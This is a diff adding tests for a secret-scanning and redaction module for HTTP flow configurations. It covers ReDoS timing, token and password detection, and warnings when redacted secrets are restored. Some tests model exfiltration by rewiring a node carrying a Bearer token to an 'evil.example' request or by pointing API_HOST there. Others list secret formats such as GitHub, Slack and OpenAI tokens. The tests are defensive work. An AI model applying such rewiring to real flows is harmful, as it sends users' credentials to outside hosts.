@@ -581,3 +581,163 @@ describe('S1/S2 detection', () => {
     expect(Date.now() - t0).toBeLessThan(2000);
   });
 });
+
+describe('round 2 — ReDoS timing (256 KB adversarial, per rule)', () => {
+  const m = createSecretNameMatcher(DEFAULT_SECRET_NAME_PATTERNS);
+  const N = 256 * 1024;
+  const fill = (s: string) => s.repeat(Math.ceil(N / s.length)).slice(0, N);
+  const cases: Record<string, string> = {
+    'conn no ;': `Password=${'x'.repeat(N)}`,
+    'conn many starts': fill(' a='),
+    'conn many pairs': fill('a=b;'),
+    'buffer.from': `Buffer.from("${'a'.repeat(N)}`,
+    'buffer.from many': fill('Buffer.from("a:'),
+    pem: fill('-----BEGIN PRIVATE KEY-----'),
+    'pem words': `-----BEGIN ${fill('A ')}`,
+    aws: fill('AKIA'),
+    github: `ghp_${'a'.repeat(N)}`,
+    slack: `xoxb-${'a'.repeat(N)}`,
+    'slack hook': `hooks.slack.com/services/${'a'.repeat(N)}`,
+    openai: `sk-${'a'.repeat(N)}`,
+    jwt: fill('eyJaaaaa.'),
+    'jwt long': `eyJ${'a'.repeat(N)}`,
+    bearer: `Bearer ${'a'.repeat(N)}`,
+    'bearer =': `Bearer aaaaaaaaaaaaaaaa1${'='.repeat(N)}`,
+    basic: `Basic ${'a'.repeat(N)}`,
+    'url creds': fill('ab://a:'),
+    'url creds long': `ab://${'a'.repeat(N)}`,
+    'url query': fill('?key='),
+    'url query amp': fill('&token=a'),
+    assign: fill('password = "'),
+    'assign long': `password = "${'a'.repeat(N)}`,
+    'assign json': fill('"password":'),
+    unquoted: fill('password: '),
+    'unquoted colons': fill('a:'),
+    spaces: ' '.repeat(N),
+  };
+  for (const [name, text] of Object.entries(cases)) {
+    it(`${name} < 200ms`, () => {
+      for (const code of [false, true]) {
+        const t0 = performance.now();
+        scanTextForSecrets(text, m, { code });
+        expect(performance.now() - t0).toBeLessThan(200);
+      }
+    });
+  }
+});
+
+describe('round 2 — detection', () => {
+  const m = createSecretNameMatcher(DEFAULT_SECRET_NAME_PATTERNS);
+  it('redacts secret-named URL query params, keeps others', () => {
+    const r = scanTextForSecrets('https://api.example/?key=abc123&x=1&access_token=Zz9-tok', m);
+    expect(r.secrets).toEqual(['abc123', 'Zz9-tok']);
+    expect(r.text).toContain('&x=1');
+    const c = scanTextForSecrets('fetch("https://api.example/v1?key=abc123")', m, { code: true });
+    expect(c.text).not.toContain('abc123');
+  });
+  it('unquoted rule does not swallow https: (query rule still sees ?key=)', () => {
+    const r = scanTextForSecrets('url: https://h.example/x?token=t0k3nvalue', m);
+    expect(r.secrets).toEqual(['t0k3nvalue']);
+  });
+  it('prose like "Session: started" / "key: value" is not redacted', () => {
+    expect(scanTextForSecrets('Session: started\nkey: value\nauth: required', m).secrets).toEqual(
+      []
+    );
+    expect(scanTextForSecrets('password: hunter2', m).secrets).toEqual(['hunter2']);
+  });
+});
+
+describe('round 2 — restore + warnings', () => {
+  const TOK = 'ghp_' + 'B1c2D3e4F5g6H7i8J9k0L1m2N3o4P5q6R7s8';
+  const live = (): Record<string, unknown>[] => [
+    {
+      id: 't8',
+      type: 'tab',
+      label: 'x',
+      env: [{ name: 'API_HOST', value: 'good.example', type: 'str' }],
+    },
+    { id: 'g8', type: 'group', z: 't8', nodes: ['h8'], env: [] },
+    {
+      id: 'h8',
+      type: 'http request',
+      z: 't8',
+      g: 'g8',
+      method: 'GET',
+      url: 'https://${API_HOST}/v1',
+      headers: [
+        { keyType: 'other', keyValue: 'Set-Cookie', valueType: 'other', valueValue: 'a=1' },
+        {
+          keyType: 'other',
+          keyValue: 'Authorization',
+          valueType: 'other',
+          valueValue: `Bearer ${TOK}`,
+        },
+        { keyType: 'other', keyValue: 'Set-Cookie', valueType: 'other', valueValue: 'b=2' },
+      ],
+      wires: [['d8']],
+    },
+    { id: 'd8', type: 'debug', z: 't8', wires: [] },
+  ];
+  const tabOf = (flat: Record<string, unknown>[]) => {
+    const [tab, ...nodes] = structuredClone(flat);
+    const red = redactFlowData({ ...tab, nodes }, DEFAULT_SECRET_NAME_PATTERNS).value;
+    return structuredClone(red) as Record<string, unknown> & {
+      nodes: Record<string, unknown>[];
+      env: Record<string, unknown>[];
+    };
+  };
+  const run = (mut: (f: ReturnType<typeof tabOf>) => void) => {
+    const flat = live();
+    const f = tabOf(flat);
+    mut(f);
+    const r = restoreRedactedPlaceholders(f, flat);
+    expect(r.unresolved).toEqual([]);
+    return secretChangeWarnings(r.restoredFields, r.flow as Record<string, unknown>, flat).map(
+      w => w.code
+    );
+  };
+  it('unchanged: no warnings', () => {
+    expect(run(() => undefined)).toEqual([]);
+  });
+  it('rewire to a new evil http request node warns', () => {
+    const codes = run(f => {
+      f.nodes.find(n => n.id === 'h8')!.wires = [['evil']];
+      f.nodes.push({
+        id: 'evil',
+        type: 'http request',
+        z: 't8',
+        url: 'https://evil.example',
+        wires: [],
+      });
+    });
+    expect(codes).toEqual(
+      expect.arrayContaining([
+        'secret_wires_changed',
+        'outbound_node_changed',
+        'secret_tab_changed',
+      ])
+    );
+  });
+  it('env indirection: tab API_HOST change warns', () => {
+    const codes = run(f => {
+      f.env[0]!.value = 'evil.example';
+    });
+    expect(codes).toContain('secret_scope_changed');
+  });
+  it('group env change warns', () => {
+    const codes = run(f => {
+      f.nodes.find(n => n.id === 'g8')!.env = [
+        { name: 'API_HOST', value: 'evil.example', type: 'str' },
+      ];
+    });
+    expect(codes).toContain('secret_scope_changed');
+  });
+  it('duplicate header keys each match one original, order kept', () => {
+    const flat = live();
+    const f = tabOf(flat);
+    const r = restoreRedactedPlaceholders(f, flat);
+    const h = (r.flow as { nodes: Record<string, unknown>[] }).nodes.find(n => n.id === 'h8')!
+      .headers as Record<string, string>[];
+    expect(h.map(x => x.valueValue)).toEqual(['a=1', `Bearer ${TOK}`, 'b=2']);
+  });
+});
